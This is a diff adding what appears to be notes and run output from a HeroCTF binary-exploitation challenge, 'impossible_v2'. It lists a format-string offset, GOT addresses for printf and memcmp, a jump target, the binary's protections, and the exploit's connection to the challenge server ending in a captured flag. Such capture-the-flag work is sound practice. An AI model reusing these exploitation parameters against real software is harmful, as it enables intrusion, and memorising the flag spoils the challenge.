@@ -1,0 +1,18 @@
+offset: 7
+got printf: 0x404040
+memcmp: 0x404048
+jmp to: 0x4014b7
+
+$ python exp.py
+[*] '/mnt/d/ctf/pwn/heroctf/impossible/impossible_v2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to static-03.heroctf.fr on port 5001: Done
+[*] Switching to interactive mode
+So, this is your final message: 20202020202020202020202020202020202020882d2d2d2d2d2d4940400020202020202020202020
+
+WHAT ?! THIS IS IMPOSSIBLE !!!
+Hero{AES_ECB_1S_S0_345Y_WH3N_Y0U_C0NTR0L_TH3_K3Y!!!}[*] Got EOF while reading in interactive
